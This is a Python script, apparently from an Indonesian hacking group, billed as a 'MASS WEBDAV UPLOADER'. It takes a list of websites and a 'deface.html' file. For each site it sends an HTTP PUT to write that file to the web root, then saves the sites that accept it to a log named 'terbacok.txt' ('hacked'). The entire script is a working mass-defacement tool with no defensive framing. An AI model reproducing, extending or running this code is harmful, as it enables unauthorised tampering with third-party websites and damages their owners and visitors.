import requests, time, sys, os
G0 = '\x1b[0;32m'
G1 = '\x1b[1;32m'
C0 = '\x1b[0;36m'
C1 = '\x1b[1;36m'
P0 = '\x1b[0;35m'
P1 = '\x1b[1;35m'
W0 = '\x1b[0;37m'
W1 = '\x1b[1;37m'
B0 = '\x1b[0;34m'
B1 = '\x1b[1;34m'
R0 = '\x1b[0;31m'
R1 = '\x1b[1;31m'
count = 0
os.system('clear')
print(u"%s\n\n            ,    _\n           /|   | |\n         _/_\\_  >_< \n        .-\\-/.   |  \n       /  | | \\_ |  %sMASS WEBDAV UPLOADER%s\n       \\ \\| |\\__(/  %s---------------------%s\n       /(`---')  |  \u2022 %sTeam    %s: %sTERMUXID3%s\n      / /     \\  |  \u2022 %sAuthor  %s: %sn74nk420%s\n   _.'  \\ '-' /  |  \u2022 %sYoutube %s: %sNjankSoekamti%s\n   `----'`=-='   '    " % (G1, C1, G1, P1, G1, C0, G1, C0, G1, C0, G1, C0, G1, C0, G1, C0, G1))
if len(sys.argv) != 3:
    print(u'\n%s[%s\u2022%s] %sPenggunaan:' % (W1, G1, W1, P1))
    print(u'%s[%s\u2022%s] %spython ' % (W1, G1, W1, C0) + sys.argv[0] + ' list.txt deface.html\n')
    exit(0)
with open(sys.argv[1]) as (myfile):
    tot = sum(1 for line in myfile)
print(u'\n%s[%s\u2022%s]%s Total %s%s%s situs dalam file\n' % (W1, P1, W1, W0, P1, tot, W0))
time.sleep(1.5)
target = open(sys.argv[1], 'r')
while 1:
    scheker = open(sys.argv[2]).read()
    sukses = open('terbacok.txt', 'a')
    host = target.readline().replace('\n', '')
    if not host:
        break
    if not host.startswith('http'):
        host = 'http://' + host
    outname = '/' + sys.argv[2]
    count += 1
    print(u'%s[%s\u2022%s]%s Upload : ' % (W1, P1, W1, W0) + sys.argv[2] + '%s [%s%s%s]' % (W1, P0, count, W1))
    print(u'%s[%s\u2022%s]%s Target : ' % (W1, P1, W1, W0) + host)
    try:
        r = requests.request('put', (host + outname), data=scheker, headers={'Content-Type': 'application/octet-stream'})
    except:
        print(u'%s[%s\u2022%s]%s Gagal  %s: %skoneksi error\n' % (W1, R1, W1, R0, W0, R0))
        continue

    if r.status_code == 200:
        print(u'%s[%s\u2022%s]%s Sukses %s: %s' % (W1, G1, W1, G0, W0, G0) + host + outname + '\n')
        sukses.write(host + outname + '\n')
    else:
        print(u'%s[%s\u2022%s]%s Gagal  %s: %s' % (W1, R1, W1, R0, W0, R0) + host + outname + '\n')

print(u'%s[%s\u2022%s]%s Hasil tersimpan : %sterbacok.txt\n' % (W1, P1, W1, W0, P0))
